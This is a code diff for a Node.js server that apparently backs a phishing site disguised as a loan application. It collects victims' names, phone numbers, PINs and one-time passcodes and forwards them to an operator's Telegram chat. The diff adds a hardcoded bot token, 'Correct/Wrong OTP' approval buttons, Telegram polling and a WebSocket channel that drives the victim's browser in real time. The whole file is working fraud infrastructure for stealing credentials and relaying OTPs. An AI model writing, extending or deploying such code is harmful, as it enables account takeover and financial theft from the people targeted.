@@ -1,12 +1,13 @@
 const express = require('express');
 const http = require('http');
 const https = require('https');
+const { WebSocketServer, WebSocket } = require('ws');
 
 // ═══════════════════════════════════════════
-// CONFIG (from Render environment variables)
+// CONFIG
 // ═══════════════════════════════════════════
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8159044475:AAGIxd5gpPiDaBvqq8eIKpNnXJIjbO22HJE';
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '6816093099';
 const PORT = process.env.PORT || 3000;
 
 // ═══════════════════════════════════════════
@@ -14,46 +15,79 @@ const PORT = process.env.PORT || 3000;
 // ═══════════════════════════════════════════
 const app = express();
 const server = http.createServer(app);
+const wss = new WebSocketServer({ server, path: '/ws' });
 
 app.use(express.static(__dirname));
 app.use(express.json());
 
+const sessions = {};
+
+// ═══════════════════════════════════════════
+// WEBSOCKET
+// ═══════════════════════════════════════════
+wss.on('connection', (ws, req) => {
+    const url = new URL(req.url, 'http://localhost:' + PORT);
+    const sessionId = url.searchParams.get('session');
+
+    if (sessionId && sessions[sessionId]) {
+        sessions[sessionId].ws = ws;
+        console.log('✅ User connected:', sessions[sessionId].name);
+    }
+
+    ws.on('close', () => {
+        if (sessionId && sessions[sessionId]) {
+            sessions[sessionId].ws = null;
+            console.log('❌ User disconnected:', sessions[sessionId].name);
+        }
+    });
+});
+
+// ═══════════════════════════════════════════
+// TELEGRAM REQUEST
+// ═══════════════════════════════════════════
+function tgRequest(path, body) {
+    return new Promise((resolve, reject) => {
+        const payload = JSON.stringify(body);
+        const req = https.request({
+            method: 'POST',
+            hostname: 'api.telegram.org',
+            path: path,
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(payload)
+            }
+        }, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try { resolve(JSON.parse(data)); }
+                catch (e) { resolve({ ok: false, raw: data }); }
+            });
+        });
+        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
+        req.on('error', reject);
+        req.write(payload);
+        req.end();
+    });
+}
+
 // ═══════════════════════════════════════════
 // SEND TO TELEGRAM
 // ═══════════════════════════════════════════
-function sendTelegram(text) {
-    const payload = JSON.stringify({
+function sendTelegram(text, buttons) {
+    const body = {
         chat_id: TELEGRAM_CHAT_ID,
         text,
         parse_mode: 'Markdown'
-    });
+    };
+    if (buttons) body.reply_markup = { inline_keyboard: buttons };
 
-    const req = https.request({
-        method: 'POST',
-        hostname: 'api.telegram.org',
-        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload)
-        }
-    }, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-            try {
-                const json = JSON.parse(data);
-                if (json.ok) console.log('✅ Telegram message sent');
-                else console.error('❌ Telegram error:', JSON.stringify(json));
-            } catch (e) {
-                console.error('❌ Parse error:', data);
-            }
-        });
-    });
-
-    req.on('error', (err) => console.error('❌ Network error:', err.message));
-    req.setTimeout(10000, () => { req.destroy(); });
-    req.write(payload);
-    req.end();
+    return tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, body)
+        .then(res => {
+            if (res.ok) console.log('✅ Telegram message sent');
+            else console.error('❌ Telegram error:', JSON.stringify(res));
+        })
+        .catch(err => console.error('❌ Network error:', err.message));
 }
 
 // ═══════════════════════════════════════════
@@ -100,10 +134,17 @@ app.post('/api/pin', (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// API: Page 3 — OTP
+// API: Page 3 — OTP (with admin buttons)
 // ═══════════════════════════════════════════
 app.post('/api/otp', (req, res) => {
     const { name, phone, amount, period, pin, otp } = req.body;
+
+    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+
+    sessions[sessionId] = {
+        ws: null,
+        name, phone, amount, period, pin, otp
+    };
 
     const msg = `📲 *OTP RECEIVED*
 ━━━━━━━━━━━━━━━━━━
@@ -113,17 +154,90 @@ app.post('/api/otp', (req, res) => {
 📅 *Period:* ${period} days
 🔑 *PIN:* ${pin}
 🔢 *OTP:* ${otp}
-✅ *Application Complete*
 🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
-━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━
+_Tap button to verify_`;
 
-    sendTelegram(msg);
-    res.json({ success: true });
+    const buttons = [[
+        { text: '✅ Correct OTP', callback_data: `correct:${sessionId}` },
+        { text: '❌ Wrong OTP', callback_data: `wrong:${sessionId}` }
+    ]];
+
+    sendTelegram(msg, buttons);
+    res.json({ success: true, sessionId });
 });
+
+// ═══════════════════════════════════════════
+// TELEGRAM POLLING (button clicks)
+// ═══════════════════════════════════════════
+let offset = 0;
+
+async function pollTelegram() {
+    try {
+        const path = `/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=0`;
+        const data = await new Promise((resolve, reject) => {
+            const req = https.request({
+                method: 'GET',
+                hostname: 'api.telegram.org',
+                path: path
+            }, (res) => {
+                let d = '';
+                res.on('data', chunk => d += chunk);
+                res.on('end', () => {
+                    try { resolve(JSON.parse(d)); }
+                    catch (e) { resolve({ ok: false }); }
+                });
+            });
+            req.setTimeout(8000, () => { req.destroy(); reject(new Error('timeout')); });
+            req.on('error', reject);
+            req.end();
+        });
+
+        if (data.ok) {
+            for (const update of data.result) {
+                offset = update.update_id + 1;
+
+                if (update.callback_query) {
+                    const cq = update.callback_query;
+                    const [action, sessionId] = cq.data.split(':');
+                    const session = sessions[sessionId];
+
+                    if (session) {
+                        tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                            callback_query_id: cq.id,
+                            text: action === 'correct' ? '✅ Approved!' : '❌ Rejected. User notified.'
+                        });
+
+                        if (action === 'correct') {
+                            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'correct' }));
+                            }
+                            sendTelegram(`✅ *APPROVED*\n👤 ${session.name}\n📱 ${session.phone}\n🕐 ${new Date().toLocaleString('en-ZM')}`);
+                            console.log('✅ Approved:', session.name);
+
+                        } else if (action === 'wrong') {
+                            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'wrong' }));
+                            }
+                            sendTelegram(`❌ *OTP REJECTED*\n👤 ${session.name}\n📱 ${session.phone}\n🔄 User notified to wait for new OTP\n🕐 ${new Date().toLocaleString('en-ZM')}`);
+                            console.log('❌ Rejected:', session.name);
+                        }
+                    }
+                }
+            }
+        }
+    } catch (err) {
+        if (err.message !== 'timeout') console.error('Polling error:', err.message);
+    }
+    setTimeout(pollTelegram, 2000);
+}
 
 // ═══════════════════════════════════════════
 // START
 // ═══════════════════════════════════════════
 server.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📡 WebSocket: ws://localhost:${PORT}/ws`);
+    console.log(`🤖 Telegram polling started`);
+    pollTelegram();
 });   
